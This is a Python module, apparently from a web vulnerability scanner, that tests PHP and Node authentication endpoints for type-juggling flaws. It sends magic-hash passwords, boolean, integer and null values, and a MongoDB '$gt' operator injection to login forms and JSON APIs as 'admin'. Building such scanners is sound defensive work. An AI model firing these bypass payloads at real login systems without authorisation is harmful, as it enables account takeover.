"""
Type Juggling Tester — Detects PHP/Node type juggling vulnerabilities.

Covers:
  - Loose comparison bypass (PHP == vs ===)
  - JSON type confusion (sending int/bool where string expected)
  - Magic hash exploitation (PHP md5 '0e' prefix)
"""
import logging
import json
import re

from apps.scanning.engine.testers.base_tester import BaseTester

logger = logging.getLogger(__name__)

# ── PHP magic hashes (md5 produces '0e...' which == 0 in PHP loose compare) ─
MAGIC_HASHES = {
    'md5': [
        '240610708',   # md5 → 0e462097431906509019562988736854
        'QNKCDZO',    # md5 → 0e830400451993494058024219903391
        'aabg7XSs',   # md5 → 0e087386482136013740957780965295
    ],
    'sha1': [
        '10932435112', # sha1 → 0e07766915004133176347055865026311692244
    ],
}

# ── Type confusion payloads for JSON APIs ────────────────────────────────────
TYPE_CONFUSION_PAYLOADS = [
    # Send boolean true instead of password string → may bypass == check
    {'field': 'password', 'original': 'string', 'evil': True,
     'description': 'Boolean true (bypasses PHP == comparison)'},
    # Send integer 0 → PHP: 0 == "any_string" is true with loose compare
    {'field': 'password', 'original': 'string', 'evil': 0,
     'description': 'Integer 0 (bypasses PHP loose comparison)'},
    # Send empty array → may bypass isset() checks
    {'field': 'password', 'original': 'string', 'evil': [],
     'description': 'Empty array (bypasses isset/empty checks)'},
    # Send null → may bypass certain checks
    {'field': 'password', 'original': 'string', 'evil': None,
     'description': 'Null value (bypasses type checks)'},
    # Send object instead of string
    {'field': 'token', 'original': 'string', 'evil': {'$gt': ''},
     'description': 'MongoDB-style operator injection via type confusion'},
]

# ── Indicators of PHP technology ─────────────────────────────────────────────
PHP_INDICATORS = re.compile(
    r'(?:\.php|PHPSESSID|X-Powered-By:\s*PHP|laravel_session|symfony)',
    re.IGNORECASE,
)

# ── Authentication/comparison endpoints ──────────────────────────────────────
AUTH_ENDPOINT_PATTERNS = [
    r'/login', r'/signin', r'/authenticate', r'/auth',
    r'/verify', r'/check', r'/validate', r'/compare',
    r'/reset[-_]?password', r'/forgot[-_]?password',
    r'/api/auth', r'/api/login', r'/api/token',
]

# ── Fields likely involved in comparison ─────────────────────────────────────
COMPARISON_FIELDS = [
    'password', 'passwd', 'pass', 'token', 'code',
    'otp', 'pin', 'secret', 'key', 'hash', 'verify',
    'confirmation', 'answer', 'response',
]


class TypeJugglingTester(BaseTester):
    """Test for PHP/Node type juggling vulnerabilities."""

    TESTER_NAME = 'Type Juggling'

    def test(self, page, depth: str = 'medium', recon_data: dict = None) -> list:
        vulns = []
        url = getattr(page, 'url', '')
        body = getattr(page, 'body', '') or ''
        headers = getattr(page, 'headers', {}) or {}
        forms = getattr(page, 'forms', []) or []
        params = getattr(page, 'parameters', {}) or {}

        is_auth = self._is_auth_endpoint(url)
        is_php = self._is_php(url, headers, body, recon_data)
        is_json_api = self._is_json_api(headers, body)

        if not is_auth and depth == 'shallow':
            return vulns

        # 1. Check for PHP magic hash vulnerability
        if is_php and is_auth:
            vuln = self._check_magic_hash(url, forms, params)
            if vuln:
                vulns.append(vuln)

        # 2. Test JSON type confusion on API endpoints
        if is_json_api and is_auth:
            vuln = self._test_json_type_confusion(url, body, forms)
            if vuln:
                vulns.append(vuln)

        if depth == 'shallow':
            return vulns

        # 3. Test loose comparison bypass via form
        if is_auth and forms:
            vuln = self._test_form_type_juggling(url, forms)
            if vuln:
                vulns.append(vuln)

        return vulns

    # ── Detection helpers ────────────────────────────────────────────────────

    def _is_auth_endpoint(self, url: str) -> bool:
        for pattern in AUTH_ENDPOINT_PATTERNS:
            if re.search(pattern, url, re.IGNORECASE):
                return True
        return False

    def _is_php(self, url: str, headers: dict, body: str,
                recon_data: dict = None) -> bool:
        if PHP_INDICATORS.search(url):
            return True
        for hdr_val in headers.values():
            if PHP_INDICATORS.search(str(hdr_val)):
                return True
        if recon_data and self._has_technology(recon_data, 'PHP'):
            return True
        return False

    def _is_json_api(self, headers: dict, body: str) -> bool:
        content_type = headers.get('Content-Type', '')
        if 'application/json' in content_type:
            return True
        # Check if body looks like JSON
        stripped = body.strip()
        if stripped.startswith('{') or stripped.startswith('['):
            return True
        return False

    # ── Vulnerability checks ─────────────────────────────────────────────────

    def _check_magic_hash(self, url: str, forms: list, params: dict):
        """Test PHP magic hash bypass on authentication forms."""
        for form in forms[:2]:
            action = getattr(form, 'action', '') or url
            method = getattr(form, 'method', 'POST').upper()
            inputs = getattr(form, 'inputs', []) or []

            password_field = None
            for inp in inputs:
                inp_name = getattr(inp, 'name', '')
                if inp_name.lower() in COMPARISON_FIELDS:
                    password_field = inp_name
                    break
            if not password_field:
                continue

            # Test magic hashes
            for hash_value in MAGIC_HASHES['md5'][:2]:
                data = {password_field: hash_value}
                # Add other form fields with default values
                for inp in inputs:
                    inp_name = getattr(inp, 'name', '')
                    if inp_name and inp_name != password_field:
                        data[inp_name] = getattr(inp, 'value', '') or 'test'

                try:
                    resp = self._make_request(method, action, data=data)
                    if resp and resp.status_code in (200, 302):
                        getattr(resp, 'text', '')
                        location = resp.headers.get('Location', '')
                        # If we get redirected to a success page or see success indicators
                        if (resp.status_code == 302
                                and 'login' not in location.lower()
                                and 'error' not in location.lower()):
                            return self._build_vuln(
                                name='PHP Magic Hash Type Juggling',
                                severity='critical',
                                category='Authentication',
                                description=(
                                    'Authentication may be bypassable using PHP magic hashes. '
                                    f'The value "{hash_value}" produces an MD5 hash starting '
                                    'with "0e", which PHP\'s == operator treats as 0.'
                                ),
                                impact='Authentication bypass, access to any account',
                                remediation=(
                                    'Use strict comparison (===) instead of loose comparison (==). '
                                    'Use password_hash()/password_verify() for password checks.'
                                ),
                                cwe='CWE-1024',
                                cvss=9.8,
                                affected_url=action,
                                evidence=f'Magic hash "{hash_value}" accepted for {password_field}',
                            )
                except Exception:
                    continue
        return None

    def _test_json_type_confusion(self, url: str, body: str, forms: list):
        """Test JSON type confusion on authentication endpoints."""
        # Try to detect the JSON structure from the body or construct one
        for confusion in TYPE_CONFUSION_PAYLOADS[:3]:
            field_name = confusion['field']
            evil_value = confusion['evil']
            desc = confusion['description']

            json_payload = {
                'username': 'admin',
                'email': 'admin@example.com',
                field_name: evil_value,
            }

            try:
                resp = self._make_request(
                    'POST', url,
                    json=json_payload,
                    headers={'Content-Type': 'application/json'},
                )
                if resp and resp.status_code in (200, 302):
                    resp_body = getattr(resp, 'text', '')
                    location = resp.headers.get('Location', '')
                    # Success indicators
                    if ('token' in resp_body.lower()
                            or 'success' in resp_body.lower()
                            or (resp.status_code == 302
                                and 'login' not in location.lower())):
                        return self._build_vuln(
                            name='JSON Type Confusion',
                            severity='critical',
                            category='Authentication',
                            description=(
                                f'The endpoint accepts non-string types for '
                                f'"{field_name}": {desc}. This may bypass '
                                'authentication logic that uses loose comparison.'
                            ),
                            impact='Authentication bypass via type juggling',
                            remediation=(
                                'Validate JSON input types strictly. Ensure password '
                                'and token fields are always strings. Use strict comparison.'
                            ),
                            cwe='CWE-1024',
                            cvss=9.8,
                            affected_url=url,
                            evidence=f'Type confusion with {type(evil_value).__name__}: '
                                     f'{json.dumps(json_payload)[:100]}',
                        )
            except Exception:
                continue
        return None

    def _test_form_type_juggling(self, url: str, forms: list):
        """Test loose comparison bypass using '0' and 'true' values."""
        for form in forms[:2]:
            action = getattr(form, 'action', '') or url
            method = getattr(form, 'method', 'POST').upper()
            inputs = getattr(form, 'inputs', []) or []

            comparison_field = None
            for inp in inputs:
                inp_name = getattr(inp, 'name', '')
                if inp_name.lower() in COMPARISON_FIELDS:
                    comparison_field = inp_name
                    break
            if not comparison_field:
                continue

            # Test with value "0" (loose comparison: "0" == false in PHP)
            juggling_values = ['0', 'true', 'false', '0e1234', '[]']
            for val in juggling_values[:2]:
                data = {comparison_field: val}
                for inp in inputs:
                    inp_name = getattr(inp, 'name', '')
                    if inp_name and inp_name != comparison_field:
                        data[inp_name] = getattr(inp, 'value', '') or 'test'

                try:
                    resp = self._make_request(method, action, data=data)
                    if resp and resp.status_code == 302:
                        location = resp.headers.get('Location', '')
                        if ('login' not in location.lower()
                                and 'error' not in location.lower()
                                and location):
                            return self._build_vuln(
                                name='Loose Comparison Type Juggling',
                                severity='high',
                                category='Authentication',
                                description=(
                                    f'The field "{comparison_field}" may use loose '
                                    f'comparison. The value "{val}" was accepted, '
                                    'suggesting PHP/Node == operator instead of ===.'
                                ),
                                impact='Authentication or validation bypass',
                                remediation='Use strict comparison (===). Validate input types.',
                                cwe='CWE-1024',
                                cvss=8.0,
                                affected_url=action,
                                evidence=f'Value "{val}" accepted for {comparison_field}',
                            )
                except Exception:
                    continue
        return None
